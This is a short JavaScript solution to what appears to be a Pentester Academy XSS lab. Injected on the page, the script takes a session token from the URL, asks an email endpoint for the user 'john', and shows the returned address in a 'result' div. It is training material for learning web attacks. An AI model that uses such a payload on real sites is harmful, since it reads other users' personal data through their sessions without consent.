// https://pentesteracademylab.appspot.com/lab/webapp/jfp/16

// Objectives:
//     Find John's Email Address using an XSS vulnerability on this page
//     Display the Email address in the div with id "result"
//     No Hardcoded values can be used - everything has to be figured out dynamically

const token = window.location.search.split('&')[1];

const http = new XMLHttpRequest();
const url = '/lab/webapp/jfp/14/email?name=john&'+token;
http.open('GET', url);
http.send();

http.onreadystatechange = function (){
    if (this.readyState == 4 && this.status == 200){
        // alert(http.responseText);
        const h4 = document.createElement('h4');
        h4.innerText = http.responseText;

        const div = document.getElementById('result');
        div.appendChild(h4);
    }
}

